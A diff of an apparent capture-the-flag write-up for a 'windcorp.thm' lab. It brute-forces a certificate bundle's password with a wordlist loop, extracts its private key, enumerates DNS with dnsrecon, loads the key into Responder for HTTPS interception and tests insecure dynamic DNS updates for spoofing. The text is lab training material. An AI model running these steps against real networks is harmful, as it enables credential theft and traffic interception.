@@ -599,47 +599,169 @@ Lucky enough, we found a certificate bundle file. Once downloaded the file I pro
     cat /usr/share/wordlists/rockyou.txt|
     while read p; do
         echo $p
-        openssl pkcs12 -in cert.pfx -passin "pass:$p";
+        openssl pkcs12 -in cert.pfx -nodes -passin "pass:$p";
         RC=$?; if [ $RC -eq 0 ]; then
     break; fi ; done
-Once a valid password is found the procedure will stop.
+Once a valid password is found the procedure will stop and will output the private key and the certificate:
 
-    ...
-    Mac verify error: invalid password?
-    xxxxxx
-    Bag Attributes
-        Microsoft Local Key set: <No Values>
-        localKeyID: 01 00 00 00 
-        friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
-        Microsoft CSP Name: Microsoft Software Key Storage Provider
-    Key Attributes
-        X509v3 Key Usage: 90 
-    Enter PEM pass phrase:
+          ...
+          Mac verify error: invalid password?
+          <here certificate password>
+          Bag Attributes
+              Microsoft Local Key set: <No Values>
+              localKeyID: 01 00 00 00 
+              friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
+              Microsoft CSP Name: Microsoft Software Key Storage Provider
+          Key Attributes
+              X509v3 Key Usage: 90 
+          -----BEGIN PRIVATE KEY-----
+          MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/3TRp/R/qfzQX
+          ...
+          y+tQYYpi8HTqt2yzZ01n6C+0
+          -----END PRIVATE KEY-----
+          Bag Attributes
+              localKeyID: 01 00 00 00 
+          subject=CN=fire.windcorp.thm
+          issuer=CN=fire.windcorp.thm
+          -----BEGIN CERTIFICATE-----
+          MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
+         ...
+          MTUqFyYKchFUeYlgf7k=
+          -----END CERTIFICATE-----
 
+Copy the key file section, starting from <i>Bag Attributes</i> until <i>-----END PRIVATE KEY-----</i> and save it in a file:
+
+          cat fire.windcorp.thm.key
+          Bag Attributes
+            ..
+          -----BEGIN PRIVATE KEY-----
+          MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC/3TRp/R/qfzQX
+          ...
+          y+tQYYpi8HTqt2yzZ01n6C+0
+          -----END PRIVATE KEY-----
+
+Save the remaning part of the output in another crt file:
+
+          cat fire.windcorp.thm.crt 
+          Bag Attributes
+             ...
+          -----BEGIN CERTIFICATE-----
+          MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
+          ...
+          MTUqFyYKchFUeYlgf7k=
+          -----END CERTIFICATE-----
+
+We will use those files later to config https in Responder.
 <!-- ganteng -->
-Then entering the same password we found even for the PEM pass phrase, we got the private key for subdomain fire.windcorp.thm 
+Using this [tool](https://github.com/nomailme/certificate-info) we can see certificate information:
 
-    Verifying - Enter PEM pass phrase:
-    -----BEGIN ENCRYPTED PRIVATE KEY-----
-    MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQRlRfAIH3GQZWouCn
-    ...
-    Grz686PIgl5MZ/+irWu2K2ch/DYB79aUuaUKHe/qDhAcr5sZfBGtURE=
-    -----END ENCRYPTED PRIVATE KEY-----
-    Bag Attributes
-        localKeyID: 01 00 00 00 
-    subject=CN=fire.windcorp.thm
-    issuer=CN=fire.windcorp.thm
-    -----BEGIN CERTIFICATE-----
-    MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
-    ...
-    MTUqFyYKchFUeYlgf7k=
-    -----END CERTIFICATE-----
+          Version]
+            V3
+          
+          [Subject]
+            CN=fire.windcorp.thm
+            Simple Name: fire.windcorp.thm
+            DNS Name: fire.windcorp.thm
+          
+          [Issuer]
+            CN=fire.windcorp.thm
+            Simple Name: fire.windcorp.thm
+            DNS Name: fire.windcorp.thm
+          
+          [Serial Number]
+            508D90BD74C28FB44255DBFA5E518CBE
+          
+          [Not Before]
+            5/29/2020 5:31:08AM
+          
+          [Not After]
+            5/29/2028 5:41:03AM
 
-    
+          ...
+          * X509v3 Subject Alternative Name(2.5.29.17):
+            DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
 
-     
+We can notice that the certificate is also (in)valid for the others subdomains as listed above. 
+<b>Note that Ra2 IP has changed from now on</b>
+Further enumerating DNS server for the subdomain we get:
 
+          dnsrecon -n 10.10.123.107 -d selfservice.windcorp.thm 
+          [*] std: Performing General Enumeration against: selfservice.windcorp.thm...
+          [-] DNSSEC is not configured for selfservice.windcorp.thm
+          [*]      CNAME selfservice.windcorp.thm fire.windcorp.thm
+          [*]      A fire.windcorp.thm 10.10.123.107
+          [*]      A fire.windcorp.thm 192.168.112.1
+          [*] Enumerating SRV Records
+          [-] No SRV Records Found for selfservice.windcorp.thm
 
+          dnsrecon -n 10.10.123.107 -d selfservice.dev.windcorp.thm
+          [*] std: Performing General Enumeration against: selfservice.dev.windcorp.thm...
+          [-] Could not resolve domain: selfservice.dev.windcorp.thm
+
+          dnsrecon -n 10.10.123.107 -d fire.windcorp.thm
+          [*] std: Performing General Enumeration against: fire.windcorp.thm...
+          [-] DNSSEC is not configured for fire.windcorp.thm
+          [*]      A fire.windcorp.thm 192.168.112.1
+          [*]      A fire.windcorp.thm 10.10.123.107
+          [*] Enumerating SRV Records
+          [-] No SRV Records Found for fire.windcorp.thm
+
+So we see that we have an alias record for selfservice.windcorp.thm  pointing to fire.windcorp.thm, so if we change the IP for A record fire.windcorp.thm to point to our attacker machine we can control both the requests for selfservice.windcorp.thm and fire.windcorp.thm. As mentioned before, to perform DNS spoofing attack in this scenario, we need:
+1. Change the DNS A record for fire.windcorp.thm to point to our attacker IP on tun0 interface
+2. Fire up Responder to intercept HTTPS request
+
+I started configure HTTPS in Responder, using the previously created files: certificate and key
+
+          sudo vi /etc/responder/Responder.conf
+          ...
+          [HTTPS Server]
+          
+          ; Configure SSL Certificates to use
+          SSLCert = /tmp/fire.windcorp.thm.crt
+          SSLKey = /tmp/fire.windcorp.thm.key
+
+At this point we can start Responder
+
+          sudo responder -I tun0 -v   
+           ...
+                 
+          [+] Poisoners:
+              LLMNR                      [ON]
+              NBT-NS                     [ON]
+              MDNS                       [ON]
+              DNS                        [ON]
+              DHCP                       [OFF]
+          
+          [+] Servers:
+              HTTP server                [ON]
+              HTTPS server               [ON]
+
+          ...
+          [+] Generic Options:
+              Responder NIC              [tun0]
+              Responder IP               [10.9.1.97]
+              Responder IPv6             [fe80::a72a:c635:d8e5:8c44]
+              Challenge set              [random]
+              Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
+
+          [+] Current Session Variables:
+              Responder Machine Name     [WIN-2OLMH4SKX1N]
+              Responder Domain Name      [TCW9.LOCAL]
+              Responder DCE-RPC Port     [47245]
+          
+          [+] Listening for events...                      
+
+Now we need to update the DNS record server, since the first flag we found seems to suggest that it's possible to perform insecure dynamic updates. Let's verify this configuration:
+
+          nsupdate                         
+          > server 10.10.123.107
+          > update add test1.windcorp.thm 86400 TXT "Test record 1"
+          > send
+          > quit
+
+Verify if the record was created:
+
+          
   
 
     
